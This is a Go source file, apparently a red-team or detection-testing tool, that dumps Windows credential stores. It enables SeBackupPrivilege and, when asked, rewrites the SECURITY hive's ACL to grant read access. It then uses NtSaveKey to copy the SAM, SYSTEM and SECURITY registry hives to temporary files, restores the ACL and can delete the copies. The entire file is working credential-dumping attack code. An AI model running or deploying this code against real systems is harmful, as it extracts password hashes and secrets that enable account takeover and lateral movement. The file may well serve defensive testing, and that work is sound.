//go:build windows

package main

import (
	"flag"
	"fmt"
	"os"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var (
	ntdll         = windows.NewLazyDLL("ntdll.dll")
	procNtSaveKey = ntdll.NewProc("NtSaveKey")

	advapi32                      = windows.NewLazyDLL("Advapi32.dll")
	procGetExplicitEntriesFromACL = advapi32.NewProc(
		"GetExplicitEntriesFromAclW",
	)
	procGetNamedSecurityInfo = advapi32.NewProc(
		"GetNamedSecurityInfoW",
	)
	procSetEntriesInACL = advapi32.NewProc(
		"SetEntriesInAclW",
	)
	procSetNamedSecurityInfo = advapi32.NewProc(
		"SetNamedSecurityInfoW",
	)

	hives     []string
	filenames []string = []string{
		"C:\\Windows\\Temp\\samcopy",
		"C:\\Windows\\Temp\\syscopy",
		"C:\\Windows\\Temp\\seccopy",
	}

	clean = flag.Bool(
		"cleanup",
		false,
		"Automatically delete saved copies of hives",
	)
	success bool = false

	security = flag.Bool(
		"security",
		false,
		"Enables the saving of SECURITY in addition to SAM/SYSTEM",
	)
)

func getproctoken() (windows.Token, error) {
	var token windows.Token

	fmt.Println("[+] Opening process token to adjust privileges")
	err := windows.OpenProcessToken(
		windows.CurrentProcess(),
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY,
		&token,
	)
	return token, err
}

func createnewstate(
	priv string,
	attributes uint32,
) (*windows.Tokenprivileges, []byte) {
	var luid windows.LUID

	// Get the LUID of the privilege
	err := windows.LookupPrivilegeValue(
		nil,
		windows.StringToUTF16Ptr(priv),
		&luid,
	)
	if err != nil {
		fmt.Printf("[!] %s\n", err)
	}

	newStateBuffer := make(
		[]byte,
		4+unsafe.Sizeof(windows.LUIDAndAttributes{}),
	)
	nsb0 := &newStateBuffer[0]
	newState := (*windows.Tokenprivileges)(unsafe.Pointer(nsb0))
	newState.PrivilegeCount = 1
	newState.Privileges[0].Luid = luid
	newState.Privileges[0].Attributes = attributes

	return newState, newStateBuffer
}

func adjusttokenprivs(
	token windows.Token,
	newState *windows.Tokenprivileges,
	newStateBuffer []byte,
) error {
	fmt.Println("[+] Adjusting privileges")
	err := windows.AdjustTokenPrivileges(
		token,
		false,
		newState,
		uint32(len(newStateBuffer)),
		nil,
		nil,
	)
	return err
}

/*
Function to enable or disable a privilege for the current token
Ripped this off almost completely from:
https://github.com/golang/go/issues/64170
*/
func enablepriv(priv string) {
	var token windows.Token
	token, err := getproctoken()
	if err != nil {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!] Exiting...")
		os.Exit(1)
	}

	var newState *windows.Tokenprivileges
	var newStateBuffer []byte
	newState, newStateBuffer = createnewstate(
		priv,
		windows.SE_PRIVILEGE_ENABLED,
	)

	err = adjusttokenprivs(token, newState, newStateBuffer)
	if err != nil {
		fmt.Printf("[-] %s\n", err)
		fmt.Println("[-] Adjusting token privileges was blocked")
		fmt.Println("[+] Exiting...")
		os.Exit(1)
	}
}

/*
Function to disable a privilege for cleanup
It's probably not needed, but leaving this in here
in case it's needed for future use
*/
/*
func disablepriv(priv string) {
	var token windows.Token
	token, err := getproctoken()
	if err != nil {
		fmt.Printf("[!] Error cleaning up: %s\n", err)
	}

	var newState *windows.Tokenprivileges
	var newStateBuffer []byte
	newState, newStateBuffer = createnewstate(
		priv,
		windows.SE_PRIVILEGE_REMOVED,
	)

	err = adjusttokenprivs(token, newState, newStateBuffer)
	if err != nil {
		fmt.Printf("[!] Error cleaning up: %s\n", err)
	}
}
*/

// Function to give ourselves read permission to the SECURITY
// hive so that we can save a copy of it
func getsecreadpermission() []windows.EXPLICIT_ACCESS {
	var newacl, oldacl windows.Handle
	seckey := "MACHINE\\SECURITY"
	var oldentries []windows.EXPLICIT_ACCESS = make(
		[]windows.EXPLICIT_ACCESS,
		1,
	)
	var entry []windows.EXPLICIT_ACCESS

	// Uncomment the below if you would rather give the
	// permission to the current user, rather than the
	// local admins group
	/*
		CurrentUser, err := user.Current()
		if err != nil {
			fmt.Printf("[!] %s\n", err))
			fmt.Println("[!] Exiting...")
			os.Exit(1)
		}
	*/

	// Comment next 3 lines if you want current user instead
	var AdminGroupSidStr string = "S-1-5-32-544"
	var AdminGroupSid *windows.SID

	AdminGroupSid, _ = windows.StringToSid(AdminGroupSidStr)

	var secDesc windows.Handle

	fmt.Println("[+] " +
		"Getting old SECURITY ACL so it can be restored later")
	ret, _, err := procGetNamedSecurityInfo.Call(
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(seckey))),
		uintptr(windows.SE_REGISTRY_KEY),
		uintptr(windows.DACL_SECURITY_INFORMATION),
		0,
		0,
		uintptr(unsafe.Pointer(&oldacl)),
		0,
		uintptr(unsafe.Pointer(&secDesc)),
	)
	if ret != 0 {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!] Couldn't backup old ACL, exiting...")
		os.Exit(1)
	}

	defer windows.LocalFree(secDesc)

	var countentries int
	/*
		Get the individual EXPLICIT_ACCESS entries from the
		ACL, which we will need to restore the original ACL
		To be sure of the number of entries, we will call
		GetExplicitEntriesFromAcl twice - once to get the
		count of entries so we can properly initialize the
		old entries array, then a second time to actually
		get the array of entries
	*/
	fmt.Println("[+] Getting EXPLICIT_ACCESS entries from old ACL")
	ret, _, err = procGetExplicitEntriesFromACL.Call(
		uintptr(oldacl),
		uintptr(unsafe.Pointer(&countentries)),
		uintptr(unsafe.Pointer(&oldentries)),
	)
	if ret != 0 {
		fmt.Printf("[!] %s\n", err)
		fmt.Printf(
			"[!] Try again with an array of size %d\n",
			countentries,
		)
		fmt.Println("[!] Exiting...")
		os.Exit(1)
	}
	oldentries = make([]windows.EXPLICIT_ACCESS, countentries)
	ret, _, err = procGetExplicitEntriesFromACL.Call(
		uintptr(oldacl),
		uintptr(unsafe.Pointer(&countentries)),
		uintptr(unsafe.Pointer(&oldentries)),
	)
	if ret != 0 {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!] Couldn't create ACL entries, exiting...")
		os.Exit(1)
	}

	// Sometimes running this gets wonky, so we will print the
	// access mask entries in case they're needed for debugging
	fmt.Println("[+] Access mask values from EXPLICIT_ACCESS entries:")
	for _, entry := range oldentries {
		fmt.Printf("[+] Access Mask: %d\n", entry.AccessPermissions)
	}

	fmt.Println("" +
		"[+] Creating a new EXPLICIT_ACCESS entry for READ access")
	ea := windows.EXPLICIT_ACCESS{
		AccessPermissions: windows.GENERIC_READ,
		AccessMode:        windows.GRANT_ACCESS,
		Inheritance:       windows.SUB_CONTAINERS_AND_OBJECTS_INHERIT,
		Trustee: windows.TRUSTEE{
			TrusteeForm: windows.TRUSTEE_IS_SID,
			TrusteeType: windows.TRUSTEE_IS_GROUP,
			// Change AdminGroupSid if using current user
			TrusteeValue: windows.TrusteeValueFromSID(AdminGroupSid),
		},
	}
	entry = []windows.EXPLICIT_ACCESS{ea}

	fmt.Println("[+] Creating modified ACL")
	ret, _, err = procSetEntriesInACL.Call(
		uintptr(len(entry)),
		uintptr(unsafe.Pointer(&entry[0])),
		uintptr(oldacl),
		uintptr(unsafe.Pointer(&newacl)),
	)
	if ret != 0 {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!} Couldn't create the ACL, exiting...]")
		os.Exit(1)
	}

	defer windows.LocalFree(newacl)

	fmt.Println("[+] Applying new ACL to SECURITY")
	var secInfo uint32 = windows.PROTECTED_DACL_SECURITY_INFORMATION
	ret, _, err = procSetNamedSecurityInfo.Call(
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(seckey))),
		uintptr(windows.SE_REGISTRY_KEY),
		uintptr(windows.DACL_SECURITY_INFORMATION|secInfo),
		0,
		0,
		uintptr(newacl),
		0,
	)
	if ret != 0 {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!} Couldn't apply the ACL, exiting...]")
		os.Exit(1)
	}

	return oldentries
}

// Function to restore the original ACL of the SECURITY hive
func revertsecpermissions(oldentries []windows.EXPLICIT_ACCESS) {
	var newacl windows.Handle
	seckey := "MACHINE\\SECURITY"

	// The oldentries parameter should be an array of the
	// EXPLICIT_ACCESS entries from the original ACL
	// ret, _, err :=
	procSetEntriesInACL.Call(
		uintptr(len(oldentries)),
		uintptr(unsafe.Pointer(&oldentries[0])),
		0, // null for the old ACL, so it will create a new one
		uintptr(unsafe.Pointer(&newacl)),
	)
	// Commenting this out because sometimes ret would get
	// a non-zero even on success, and err would be "the
	// operation completed successfully"
	/*
		if ret != 0 {
			fmt.Printf("[!] %s\n", err)
			os.Exit(1)
		}
	*/

	defer windows.LocalFree(newacl)

	fmt.Println("[+] Applying old ACL to SECURITY")
	var secInfo uint32 = windows.PROTECTED_DACL_SECURITY_INFORMATION
	ret, _, err := procSetNamedSecurityInfo.Call(
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(seckey))),
		uintptr(windows.SE_REGISTRY_KEY),
		uintptr(windows.DACL_SECURITY_INFORMATION|secInfo),
		0,
		0,
		uintptr(newacl),
		0,
	)
	if ret != 0 {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!} Couldn't apply the old ACL...]")
		fmt.Println("[!] You may have to manually fix it")

	}
}

// Function to save a hive to a specified outfile
func savehive(hive string, outfile string) {
	fmt.Printf("[+] Opening handle to %s\n", hive)
	k, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		hive,
		registry.QUERY_VALUE,
	)
	if err != nil {
		fmt.Printf("[-] %s\n", err)
		fmt.Println("[-] Opening handle to hive was blocked")
		fmt.Println("[+] Exiting...")
		os.Exit(1)
	}

	fmt.Printf("[+] Opening handle to %s\n", outfile)
	unifile, err := windows.UTF16PtrFromString(outfile)
	if err != nil {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!] Unexpected error, exiting...")
		os.Exit(1)
	}

	// The 4 passed as the fifth parameter is for OPEN_ALWAYS
	// from:
	// https://learn.microsoft.com/
	// en-us/windows/win32/api/fileapi/nf-fileapi-createfilew
	fh, err := windows.CreateFile(
		unifile,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		0,
		nil,
		4,
		0,
		0,
	)
	if err != nil {
		fmt.Printf("[!] %s\n", err)
		fmt.Println("[!] Error creating file, exiting...")
		os.Exit(1)
	}

	// NtSaveKey - sneaky, sneaky
	// Just pass the handle to the key, and handle to the file
	fmt.Println("[+] Saving hive to file.")
	stat, _, err := procNtSaveKey.Call(uintptr(k), uintptr(fh))
	if stat != 0 {
		fmt.Printf("[-] %s\n", err)
		fmt.Printf("[-] status returned is %0x\n", uintptr(stat))
		fmt.Println("[-] Saving hive to file was blocked")
		fmt.Println("[+] Exiting...")
		os.Exit(1)
	}
	defer windows.Close(fh)
}

func execute() {
	var oldentries []windows.EXPLICIT_ACCESS

	fmt.Println("[+] Enabling SeBackupPrivilege")
	enablepriv("SeBackupPrivilege")

	if *security {
		hives = []string{"SAM", "SYSTEM", "SECURITY"}
		fmt.Println("[+] Giving ourselves READ access to the SECURITY hive.")
		oldentries = getsecreadpermission()
	} else {
		hives = []string{"SAM", "SYSTEM"}
	}

	fmt.Println("[+] Saving the hives")
	for i, h := range hives {
		outfile := filenames[i]
		savehive(h, outfile)
	}

	if *security {
		// Restore the original ACL EXPLICIT_ACCESS entries
		revertsecpermissions(oldentries)
		defer windows.LocalFree(
			(windows.Handle)(unsafe.Pointer(&oldentries)),
		)
	}

	fmt.Println("[+] Waiting 3 seconds before checking files...")
	time.Sleep(3 * time.Second)

	for _, f := range filenames {
		if _, err := os.Stat(f); err == nil {
			fmt.Printf("[+] %s exists, "+
				"hive was successfully copied\n", f)
			success = true
		}
	}

}

func cleanup() {
	fmt.Println("[+] Waiting 10 seconds before cleaning up...")
	time.Sleep(10 * time.Second)
	fmt.Println("[+] Cleaning up")

	if success {
		fmt.Println("[+] Attempting to remove saved files")
		for _, f := range filenames {
			if _, err := os.Stat(f); err == nil {
				err = os.Remove(f)
				if err != nil {
					fmt.Printf("[-] Could not remove %s\n", f)
				} else {
					fmt.Printf("[+] Successfully removed %s\n", f)
				}
			}
		}
	} else {
		fmt.Println("[-] Nothing to clean up")
	}
	// disablepriv("SeBackupPrivilege")
}

func main() {
	flag.Parse()
	execute()

	if *clean {
		cleanup()
	}

	if success {
		fmt.Println("[+] WOOOOOO! At least one hive was copied")
		fmt.Println("[+] Have a nice day")
		os.Exit(0)
	} else {
		fmt.Println("[-] Execution was blocked (or errored out)")
		fmt.Println("[+] Your day can only get better from here")
		os.Exit(1)

	}
}
